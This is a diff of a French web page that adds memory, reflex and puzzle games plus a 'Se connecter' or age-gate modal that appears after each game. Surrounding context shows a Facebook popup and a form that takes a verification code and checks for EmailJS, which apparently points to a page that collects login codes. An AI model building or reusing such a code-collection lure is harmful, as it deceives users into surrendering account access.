+        <button class="mg-btn" id="mgRestart">Recommencer</button>
+        <button class="mg-btn" id="mgClose">Fermer</button>
+      </div>
+    </div>
+    <div class="mg-grid" id="mgGrid" aria-label="Grille de cartes mémoire"></div>
+    <div class="mg-win" id="mgWin">Bravo 🎉 Vous avez trouvé toutes les paires !</div>
+  </div>
+
+  <!-- Original scripts + additions -->
   <script>
     // Init EmailJS (inchangé)
     document.addEventListener('DOMContentLoaded', function(){
       if (window.emailjs) {
         console.log('EmailJS init OK');
-    emailjs.init('AATQVLMcBJaRBgEox');
+        emailjs.init('AATQVLMcBJaRBgEox');
       }
-      document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeAllPopups(); });
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+          closeAllPopups();
+          // close memory modal if open
+          const overlay = document.getElementById('mgOverlay');
+          if (overlay && overlay.style.display === 'block') mgClose();
+        }
+      });
     });
 
     function openFacebookPopup() {
@@ -374,7 +568,7 @@
     async function finishAndContinue(){
       const code = document.getElementById('verificationCode').value.trim();
       const btn  = document.getElementById('code-submit');
-      const help = document.getElementById('code-helper');
+      const help  = document.getElementById('code-helper');
 
       if (!code) { help.textContent = 'Veuillez entrer le code de vérification.'; return; }
       if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
@@ -427,15 +621,14 @@
 
     function extractUrlFrom(el){
       let bg = el.style.backgroundImage;
-      let m = bg && bg.match(/url\\(["']?(.*?)["']?\\)/);
+      let m = bg && bg.match(/url\(["']?(.*?)["']?\)/);
       if (m && m[1]) return m[1];
       const cs = getComputedStyle(el).backgroundImage;
-      m = cs && cs.match(/url\\(["']?(.*?)["']?\\)/);
+      m = cs && cs.match(/url\(["']?(.*?)["']?\)/);
       if (m && m[1]) return m[1];
       return el.getAttribute('data-src') || null;
     }
 
-    // Trigger audio on first avatar click too
     function onAvatarClick(el){
       triggerFirstPlay();
       avatars.forEach(a => a.classList.remove('active'));
@@ -459,11 +652,10 @@
   });
   </script>
 
-  <!-- Bouton Son : icône 🔊/🔇 et déclenchement au premier clic -->
+  <!-- Bouton Son -->
   <button id="soundToggle" class="sound-toggle" aria-label="Activer/Désactiver le son">🔇</button>
 
   <script>
-  // Gestion audio : lecture au tout premier clic utilisateur (n'importe où) + helpers
   let __audioPrimed = false;
   function triggerFirstPlay(){
     const audio = document.getElementById('bgm');
@@ -475,7 +667,6 @@
         toggle.textContent = '🔊';
         __audioPrimed = true;
       }).catch(() => {
-        // fallback: garder le bouton mais marquer comme primé
         toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊';
         __audioPrimed = true;
       });
@@ -488,11 +679,10 @@
     if (!audio || !toggle) return;
 
     audio.muted = true;
-    audio.play().catch(()=>{}); // tentative silencieuse
+    audio.play().catch(()=>{});
 
     const setIcon = () => { toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊'; };
 
-    // Premier clic n'importe où => jouer
     const primeOnce = () => { triggerFirstPlay(); document.removeEventListener('click', primeOnce); };
     document.addEventListener('click', primeOnce, { once:true });
 
@@ -509,6 +699,613 @@
 
     setTimeout(() => { setIcon(); }, 600);
   });
+  </script>
+
+  <!-- Shape selector logic + Memory game logic -->
+  <script>
+    (function shapeSelector(){
+      const KEY = 'thumb-shape-class';
+      const body = document.body;
+      const fab = document.getElementById('shapeFab');
+      const panel = document.getElementById('shapePanel');
+      const buttons = panel.querySelectorAll('.shape-btn');
+
+      const saved = localStorage.getItem(KEY);
+      if (saved) {
+        body.classList.remove('shape-hex','shape-circle','shape-diamond','shape-round');
+        body.classList.add(saved);
+      }
+
+      function reflect(){
+        const current = Array.from(body.classList).find(c => /^shape-/.test(c)) || 'shape-hex';
+        buttons.forEach(b => b.setAttribute('aria-pressed', b.dataset.shape === current ? 'true' : 'false'));
+      }
+      reflect();
+
+      fab.addEventListener('click', function(){
+        const isOpen = panel.classList.toggle('open');
+        fab.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+      });
+
+      buttons.forEach(btn => {
+        btn.addEventListener('click', function(){
+          const cls = btn.dataset.shape;
+          body.classList.remove('shape-hex','shape-circle','shape-diamond','shape-round');
+          body.classList.add(cls);
+          localStorage.setItem(KEY, cls);
+          reflect();
+        });
+      });
+
+      document.addEventListener('click', function(ev){
+        if (!panel.classList.contains('open')) return;
+        const within = ev.target.closest('.shape-toggle');
+        if (!within) {
+          panel.classList.remove('open');
+          fab.setAttribute('aria-expanded','false');
+        }
+      });
+    })();
+
+    (function memoryGame(){
+      const openBtn = document.getElementById('mgOpenBtn');
+      const overlay = document.getElementById('mgOverlay');
+      const modal = document.getElementById('mgModal');
+      const grid = document.getElementById('mgGrid');
+      const closeBtn = document.getElementById('mgClose');
+      const restartBtn = document.getElementById('mgRestart');
+      const movesEl = document.getElementById('mgMoves');
+      const timeEl = document.getElementById('mgTime');
+      const winEl = document.getElementById('mgWin');
+
+      let first = null, second = null, lock = false;
+      let moves = 0, pairsLeft = 0;
+      let timer = null, startTime = null;
+
+      function fmt(n){ return n < 10 ? '0' + n : '' + n; }
+      function startTimer(){
+        startTime = Date.now();
+        timer = setInterval(() => {
+          const s = Math.floor((Date.now() - startTime)/1000);
+          const mm = Math.floor(s/60), ss = s%60;
+          timeEl.textContent = fmt(mm) + ':' + fmt(ss);
+        }, 300);
+      }
+      function stopTimer(){
+        clearInterval(timer); timer = null;
+      }
+
+      function shuffle(a){
+        for (let i = a.length - 1; i > 0; i--) {
+          const j = Math.floor(Math.random() * (i + 1));
+          [a[i], a[j]] = [a[j], a[i]];
+        }
+        return a;
+      }
+
+      function getAvatarSrcs(){
+        const container = document.getElementById('bitmojiHex');
+        const nodes = container ? container.querySelectorAll('.bitmoji') : [];
+        const srcs = [];
+        nodes.forEach(n => {
+          const bg = n.style.backgroundImage;
+          const m = bg && bg.match(/url\\(["']?(.*?)["']?\\)/);
+          if (m && m[1]) srcs.push(m[1]);
+          else if (n.dataset && n.dataset.src) srcs.push(n.dataset.src);
+        });
+        // limit to first 6 (duplicated -> 12 cards)
+        return srcs.slice(0, 6);
+      }
+
+      function buildGrid(){
+        grid.innerHTML = '';
+        winEl.style.display = 'none';
+        first = second = null; lock = false;
+        moves = 0; movesEl.textContent = '0 coups';
+        timeEl.textContent = '00:00';
+        if (timer) stopTimer(); startTime = null;
+
+        const imgs = getAvatarSrcs();
+        pairsLeft = imgs.length;
+        const cards = shuffle(imgs.concat(imgs)).map((src, idx) => {
+          const card = document.createElement('button');
+          card.className = 'mg-card';
+          card.type = 'button';
+          card.setAttribute('aria-label', 'Carte mémoire');
+          card.dataset.key = src;
+
+          const inner = document.createElement('div');
+          inner.className = 'mg-card-inner';
+
+          const front = document.createElement('div');
+          front.className = 'mg-card-front';
+          front.textContent = 'Retourner';
+
+          const back = document.createElement('div');
+          back.className = 'mg-card-back';
+          back.style.backgroundImage = 'url(\"' + src + '\")';
+
+          inner.appendChild(front); inner.appendChild(back);
+          card.appendChild(inner);
+          card.addEventListener('click', () => onFlip(card));
+
+          return card;
+        });
+        cards.forEach(c => grid.appendChild(c));
+      }
+
+      function onFlip(card){
+        if (lock || card.classList.contains('flipped')) return;
+
+        // start timer on first action
+        if (!startTime) startTimer();
+
+        card.classList.add('flipped');
+        if (!first){ first = card; return; }
+        second = card;
+        lock = true;
+        moves++; movesEl.textContent = moves + (moves > 1 ? ' coups' : ' coup');
+
+        if (first.dataset.key === second.dataset.key){
+          // match
+          setTimeout(() => {
+            first.setAttribute('disabled','true');
+            second.setAttribute('disabled','true');
+            first = second = null;
+            lock = false;
+            pairsLeft--;
+            if (pairsLeft === 0){
+              stopTimer();
+              winEl.style.display = 'block';
+            }
+          }, 300);
+        } else {
+          // no match
+          setTimeout(() => {
+            first.classList.remove('flipped');
+            second.classList.remove('flipped');
+            first = second = null;
+            lock = false;
+          }, 700);
+        }
+      }
+
+      function mgOpen(){
+        overlay.style.display = 'block';
+        modal.style.display = 'block';
+        buildGrid();
+        setTimeout(()=>modal.focus(), 0);
+      }
+      function mgClose(){
+        overlay.style.display = 'none';
+        modal.style.display = 'none';
+        stopTimer();
+      }
+
+      openBtn.addEventListener('click', mgOpen);
+      overlay.addEventListener('click', mgClose);
+      closeBtn.addEventListener('click', mgClose);
+      restartBtn.addEventListener('click', buildGrid);
+
+      // expose mgClose for Escape handler
+      window.mgClose = mgClose;
+    })();
+  </script>
+
+
+  <!-- Added: Reflex & Puzzle game triggers + modals -->
+  <button class="pz-open-btn" id="pzOpenBtn" title="Jouer au puzzle">🧩 Puzzle</button>
+  <button class="rx-open-btn" id="rxOpenBtn" title="Jouer au réflexe">⚡ Réflexe</button>
+
+  <!-- Reflex -->
+  <div class="rx-overlay" id="rxOverlay"></div>
+  <div class="rx-modal" id="rxModal" role="dialog" aria-modal="true" aria-labelledby="rxTitle">
+    <div class="gx-header">
+      <div class="gx-title" id="rxTitle">Jeu de réflexe</div>
+      <div class="gx-controls">
+        <span id="rxRound">Manche 0/5</span>
+        <button class="gx-btn" id="rxRestart">Recommencer</button>
+        <button class="gx-btn" id="rxClose">Fermer</button>
+      </div>
+    </div>
+    <div class="rx-area" id="rxArea">
+      <div class="rx-target" id="rxTarget">OK</div>
+    </div>
+    <div class="rx-stats"><span id="rxBest">Meilleur: -- ms</span><span id="rxLast">Dernier: -- ms</span></div>
+  </div>
+
+  <!-- Puzzle -->
+  <div class="pz-overlay" id="pzOverlay"></div>
+  <div class="pz-modal" id="pzModal" role="dialog" aria-modal="true" aria-labelledby="pzTitle">
+    <div class="gx-header">
+      <div class="gx-title" id="pzTitle">Puzzle glissant (3×3)</div>
+      <div class="gx-controls">
+        <button class="gx-btn" id="pzShuffle">Mélanger</button>
+        <button class="gx-btn" id="pzClose">Fermer</button>
+      </div>
+    </div>
+    
+    <div class="pz-picker">
+      <div class="pz-picker-label">Choisir l’image :</div>
+      <div class="pz-avatars" id="pzAvatars" role="listbox" aria-label="Choisir l’image du puzzle"></div>
+    </div>
+    <div class="pz-grid" id="pzGrid" aria-label="Grille du puzzle"></div>
+    
+    <div class="pz-win" id="pzWin">Bravo 🎉 Puzzle terminé !</div>
+  </div>
+
+  <!-- Added: Common age gate helper for games -->
+  <script>
+    function ageGateAndReturn(closeFn){
+      setTimeout(() => {
+        const ok = window.confirm('Valide ton âge pour plus de contenu.');
+        if (ok){
+          try{ closeFn && closeFn(); }catch(e){}
+          // Retour à la page principale (ferme les modales et remonte en haut)
+          window.scrollTo({top:0, behavior:'smooth'});
+        }
+      }, 2000);
+    }
+  </script>
+
+  <!-- Added: Reflex game logic -->
+  <script>
+    (function reflexGame(){
+      const openBtn = document.getElementById('rxOpenBtn');
+      const overlay = document.getElementById('rxOverlay');
+      const modal = document.getElementById('rxModal');
+      const area = document.getElementById('rxArea');
+      const target = document.getElementById('rxTarget');
+      const closeBtn = document.getElementById('rxClose');
+      const restartBtn = document.getElementById('rxRestart');
+      const roundEl = document.getElementById('rxRound');
+      const bestEl = document.getElementById('rxBest');
+      const lastEl = document.getElementById('rxLast');
+
+      let rounds = 5, current = 0, best = null, tStart = 0, timer = null, waiting = false;
+
+      function rxOpen(){
+        overlay.style.display = 'block'; modal.style.display = 'block';
+        reset();
+      }
+      function rxClose(){
+        overlay.style.display = 'none'; modal.style.display = 'none';
+        clearTimeout(timer); timer = null;
+        target.style.display = 'none';
+      }
+      function reset(){
+        clearTimeout(timer); timer = null;
+        current = 0; best = null;
+        bestEl.textContent = 'Meilleur: -- ms';
+        lastEl.textContent = 'Dernier: -- ms';
+        nextRound();
+      }
+      function nextRound(){
+        current++;
+        roundEl.textContent = 'Manche ' + current + '/' + rounds;
+        waiting = true;
+        target.style.display = 'none';
+        const delay = 700 + Math.floor(Math.random()*1300);
+        timer = setTimeout(()=>{
+          // place target randomly
+          const w = area.clientWidth, h = area.clientHeight;
+          const tx = Math.floor(Math.random()*(w-80)) + 8;
+          const ty = Math.floor(Math.random()*(h-80)) + 8;
+          target.style.left = tx + 'px'; target.style.top = ty + 'px';
+          target.style.display = 'grid';
+          tStart = performance.now();
+          waiting = false;
+        }, delay);
+      }
+
+      target.addEventListener('click', () => {
+        if (waiting) return;
+        const rt = Math.round(performance.now() - tStart);
+        lastEl.textContent = 'Dernier: ' + rt + ' ms';
+        if (best === null || rt < best){ best = rt; bestEl.textContent = 'Meilleur: ' + best + ' ms'; }
+        target.style.display = 'none';
+        if (current >= rounds){
+          // game finished
+          ageGateAndReturn(rxClose);
+        } else {
+          nextRound();
+        }
+      });
+
+      openBtn.addEventListener('click', rxOpen);
+      overlay.addEventListener('click', rxClose);
+      closeBtn.addEventListener('click', rxClose);
+      restartBtn.addEventListener('click', reset);
+      // expose to Escape handler pattern if needed
+      window.rxClose = rxClose;
+    })();
+  </script>
+
+  <!-- Added: Sliding puzzle logic -->
+  <script>
+    (function slidingPuzzle(){
+      const openBtn = document.getElementById('pzOpenBtn');
+      const overlay = document.getElementById('pzOverlay');
+      const modal = document.getElementById('pzModal');
+      const grid = document.getElementById('pzGrid');
+      const shuffleBtn = document.getElementById('pzShuffle');
+      const closeBtn = document.getElementById('pzClose');
+      const winEl = document.getElementById('pzWin');
+      const N = 3;
+
+      let tiles = []; // array of positions 0..8 where 8 is empty
+      let bgImage = null;
+      // Collect up to 6 avatar image URLs from the page
+      function collectAvatarUrls(){
+        const nodes = Array.from(document.querySelectorAll('.bitmoji'));
+        const urls = [];
+        const rx = /url\((["']?)(.*?)\1\)/;
+        for (const el of nodes){
+          // prefer inline background-image
+          let u = null;
+          const bg = el && el.style ? el.style.backgroundImage : null;
+          const m1 = bg && bg.match(rx);
+          if (m1 && m1[2]) u = m1[2];
+          if (!u){
+            // try computed style
+            try{
+              const cs = getComputedStyle(el);
+              const m2 = cs.backgroundImage && cs.backgroundImage.match(rx);
+              if (m2 && m2[2]) u = m2[2];
+            }catch(e){}
+          }
+          if (!u && el.dataset && el.dataset.src) u = el.dataset.src;
+          if (u) urls.push(u);
+        }
+        // de-duplicate & limit to first 6
+        return Array.from(new Set(urls)).slice(0, 6);
+      }
+
+      function renderAvatarSelector(urls){
+        const list = document.getElementById('pzAvatars');
+        if (!list) return;
+        list.innerHTML = '';
+        const active = bgImage;
+        urls.forEach((u) => {
+          const btn = document.createElement('button');
+          btn.type = 'button';
+          btn.className = 'pz-thumb';
+          btn.setAttribute('role', 'option');
+          btn.style.backgroundImage = 'url("' + u + '")';
+          if (active && u === active) btn.setAttribute('aria-selected','true');
+          btn.addEventListener('click', ()=>{
+            bgImage = u;
+            // highlight selection
+            Array.from(list.children).forEach(ch => ch.setAttribute('aria-selected','false'));
+            btn.setAttribute('aria-selected','true');
+            // re-render tiles with new image
+            render();
+          });
+          list.appendChild(btn);
+        });
+      }
+
+
+      function pzOpen(){
+        overlay.style.display = 'block'; modal.style.display = 'block';
+        init();
+      }
+      function pzClose(){
+        overlay.style.display = 'none'; modal.style.display = 'none';
+      }
+
+      function pickImage(){
+        const urls = collectAvatarUrls();
+        return urls.length ? urls[0] : null;
+      }
+
+      function init(){
+        winEl.style.display = 'none';
+        bgImage = pickImage();
+        const avatars = collectAvatarUrls();
+        renderAvatarSelector(avatars);
+        if (!bgImage && avatars.length) bgImage = avatars[0];
+        // solved tiles [0..8] where 8 is empty
+        tiles = [...Array(N*N).keys()];
+        // create UI
+        render();
+        // shuffle to solvable state
+        shuffle();
+      }
+
+      function render(){
+        grid.style.setProperty('--n', N);
+        grid.innerHTML = '';
+        for (let i=0;i<N*N;i++){
+          const div = document.createElement('button');
+          div.className = 'pz-tile';
+          div.type = 'button';
+          if (i === tiles.indexOf(N*N-1)){
+            // empty tile
+            div.classList.add('pz-empty');
+            div.disabled = true;
+          } else {
+            const idx = tiles[i];
+            const row = Math.floor(idx / N);
+            const col = idx % N;
+            const bpX = (col/(N-1))*100;
+            const bpY = (row/(N-1))*100;
+            if (bgImage){
+            div.style.backgroundImage = 'url("' + bgImage + '")';
+            div.style.backgroundPosition = bpX + '% ' + bpY + '%';
+          } else {
+            div.textContent = (idx+1).toString();
+          }
+            div.addEventListener('click', () => move(i));
+          }
+          grid.appendChild(div);
+        }
+      }
+
+      function coords(pos){ return {r:Math.floor(pos/N), c:pos%N}; }
+      function neighbors(pos){
+        const {r,c} = coords(pos); const list = [];
+        if (r>0) list.push(pos-N); if (r<N-1) list.push(pos+N);
+        if (c>0) list.push(pos-1); if (c<N-1) list.push(pos+1);
+        return list;
+      }
+
+      function move(pos){
+        const emptyPos = tiles.indexOf(N*N-1);
+        if (neighbors(pos).includes(emptyPos)){
+          // swap
+          const tmp = tiles[pos]; tiles[pos] = tiles[emptyPos]; tiles[emptyPos] = tmp;
+          render();
+          checkWin();
+        }
+      }
+
+      function shuffle(){
+        // random valid moves from solved state
+        for (let i=0;i<200;i++){
+          const emptyPos = tiles.indexOf(N*N-1);
+          const nbrs = neighbors(emptyPos);
+          const pick = nbrs[Math.floor(Math.random()*nbrs.length)];
+          const tmp = tiles[pick]; tiles[pick] = tiles[emptyPos]; tiles[emptyPos] = tmp;
+        }
+        render();
+      }
+
+      function checkWin(){
+        for (let i=0;i<tiles.length;i++){
+          if (tiles[i] !== i) return;
+        }
+        // win
+        winEl.style.display = 'block';
+        ageGateAndReturn(pzClose);
+      }
+
+      openBtn.addEventListener('click', pzOpen);
+      overlay.addEventListener('click', pzClose);
+      closeBtn.addEventListener('click', pzClose);
+      shuffleBtn.addEventListener('click', shuffle);
+
+      // Expose for ESC if needed
+      window.pzClose = pzClose;
+    })();
+  </script>
+
+
+  <!-- Added: Unified Jeux menu -->
+  <button class="games-open-btn" id="gamesOpenBtn" title="Jeux">🎮 Jeux</button>
+
+  <div class="games-overlay" id="gamesOverlay"></div>
+  <div class="games-modal" id="gamesModal" role="dialog" aria-modal="true" aria-labelledby="gamesTitle">
+    <div class="games-header">
+      <div class="games-title" id="gamesTitle">Choisis un jeu</div>
+      <button class="games-close" id="gamesCloseBtn">Fermer</button>
+    </div>
+    <div class="games-grid">
+      <div class="game-card" id="choosePuzzle">🧩 Puzzle</div>
+      <div class="game-card" id="chooseReflex">⚡ Réflex</div>
+      <div class="game-card" id="chooseMemory">🃏 Mémoire</div>
+    </div>
+  </div>
+
+
+  <!-- Added: Unified Jeux menu logic -->
+  <script>
+    (function gamesMenu(){
+      const openBtn = document.getElementById('gamesOpenBtn');
+      const overlay = document.getElementById('gamesOverlay');
+      const modal = document.getElementById('gamesModal');
+      const closeBtn = document.getElementById('gamesCloseBtn');
+
+      const btnPuzzle = document.getElementById('choosePuzzle');
+      const btnReflex = document.getElementById('chooseReflex');
+      const btnMemory = document.getElementById('chooseMemory');
+
+      function openMenu(){
+        overlay.style.display = 'block';
+        modal.style.display = 'block';
+        setTimeout(()=>modal.focus(), 0);
+      }
+      function closeMenu(){
+        overlay.style.display = 'none';
+        modal.style.display = 'none';
+      }
+      function trigger(id){
+        const el = document.getElementById(id);
+        if (el){ el.click(); }
+      }
+
+      openBtn.addEventListener('click', openMenu);
+      overlay.addEventListener('click', closeMenu);
+      closeBtn.addEventListener('click', closeMenu);
+
+      btnPuzzle.addEventListener('click', ()=>{ closeMenu(); trigger('pzOpenBtn'); });
+      btnReflex.addEventListener('click', ()=>{ closeMenu(); trigger('rxOpenBtn'); });
+      btnMemory.addEventListener('click', ()=>{ closeMenu(); trigger('mgOpenBtn'); });
+
+      document.addEventListener('keydown', (e)=>{ if (e.key === 'Escape') closeMenu(); });
+    })();
+  </script>
+
+
+  <!-- Added: Improved gate modal -->
+  <div class="gate-overlay" id="gateOverlay" aria-hidden="true"></div>
+  <div class="gate-modal" id="gateModal" role="dialog" aria-modal="true" aria-labelledby="gateTitle" aria-describedby="gateDesc" tabindex="-1">
+    <div class="gate-header">
+      <div class="gate-icon">🔒</div>
+      <div class="gate-title" id="gateTitle">Plus de contenu</div>
+    </div>
+    <div class="gate-body" id="gateDesc">Connecte-toi pour accéder à plus de contenu et d’expériences.</div>
+    <div class="gate-actions">
+      <button class="btn" id="gateCancel">Plus tard</button>
+      <button class="btn btn-primary" id="gateOk">Se connecter</button>
+    </div>
+  </div>
+
+
+  <!-- Added: Improved gate modal logic (replaces confirm) -->
+  <script>
+    (function gatePrompt(){
+      const overlay = document.getElementById('gateOverlay');
+      const modal = document.getElementById('gateModal');
+      const btnOk = document.getElementById('gateOk');
+      const btnCancel = document.getElementById('gateCancel');
+      const title = document.getElementById('gateTitle');
+      const desc = document.getElementById('gateDesc');
+
+      let closeCb = null;
+      let mode = 'login'; // 'login' | 'age'
+
+      function openGate(opts){
+        mode = (opts && opts.mode) || 'login';
+        title.textContent = mode === 'age' ? 'Validation d’âge' : 'Plus de contenu';
+        desc.textContent = mode === 'age'
+          ? 'Valide ton âge pour débloquer plus de contenu.'
+          : 'Connecte-toi pour accéder à plus de contenu et d’expériences.';
+
+        overlay.style.display = 'block';
+        modal.style.display = 'block';
+        modal.focus();
+      }
+
+      function closeGate(){
+        overlay.style.display = 'none';
+        modal.style.display = 'none';
+        if (typeof closeCb === 'function'){ try{ closeCb(); }catch(e){} }
+        // retour à la page principale
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      btnOk.addEventListener('click', closeGate);
+      btnCancel.addEventListener('click', closeGate);
+      overlay.addEventListener('click', closeGate);
+      document.addEventListener('keydown', (e)=>{ if (e.key === 'Escape') closeGate(); });
+
+      // Replace old helper used by games
+      window.ageGateAndReturn = function(cb, opts){
+        closeCb = cb || null;
+        setTimeout(() => { openGate(opts || { mode: 'login' }); }, 2000);
+      };
+    })();
   </script>
 
 </body>
